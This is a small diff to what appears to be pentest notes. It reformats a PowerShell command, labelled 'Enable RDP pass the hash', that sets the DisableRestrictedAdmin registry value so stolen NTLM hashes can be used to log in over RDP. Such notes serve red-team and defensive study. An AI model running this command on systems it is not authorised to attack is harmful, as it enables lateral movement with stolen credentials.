@@ -19,5 +19,4 @@ To disable RestrictedAdmin mode, set the value of DisableRestrictedAdmin to 1
 
 
 Enable RDP pass the hash:
-New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
-"DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
